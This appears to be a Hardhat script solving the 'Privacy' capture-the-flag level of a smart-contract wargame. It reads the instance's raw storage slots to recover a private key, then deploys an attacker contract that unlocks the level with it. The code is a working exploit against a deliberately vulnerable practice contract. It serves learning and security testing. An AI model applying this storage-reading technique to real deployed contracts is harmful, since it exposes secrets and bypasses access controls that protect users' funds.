const { ethers } = require('hardhat');

async function main() {
    const [owner, player] = await ethers.getSigners();

    console.log("\n[0] original owner: ", owner.address);
    console.log("[0] player: ", player.address);

    console.log("\n[1] deploy PrivacyFactory");
    const Factory = await ethers.getContractFactory("PrivacyFactory");
    const factory = await Factory.connect(owner).deploy();
    await factory.deployed();
    console.log("---- PrivacyFactory address: ", factory.address);

    console.log("\n[2] create a Privacy instance");
    const receipt = await factory.connect(player).createInstance(player.address);
    const instance_address = (await receipt.wait()).events[0].args[0];
    const privacy = await ethers.getContractAt("Privacy", instance_address, owner);
    console.log("---- Privacy address: ", privacy.address);

    console.log("\n[3] get storage data");
    console.log(await ethers.provider.getStorageAt(privacy.address, 0));
    console.log(await ethers.provider.getStorageAt(privacy.address, 1));
    console.log(await ethers.provider.getStorageAt(privacy.address, 2));
    console.log(await ethers.provider.getStorageAt(privacy.address, 3));
    console.log(await ethers.provider.getStorageAt(privacy.address, 4));
    console.log(await ethers.provider.getStorageAt(privacy.address, 5));
    const key = await ethers.provider.getStorageAt(privacy.address, 5);

    console.log("\n[4] deploy Attacker");
    const Attack = await ethers.getContractFactory("PrivacyAttack");
    const attack = await Attack.connect(player).deploy(privacy.address, key);
    await attack.deployed();

    attack.attack();

    console.log("\n[5] validate solved");
    const res = await factory.validateInstance(privacy.address, player.address);

    if (res == true) {
        console.log("[+] Done!");
    } else {
        console.log("[+] Fail...");
    }
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});


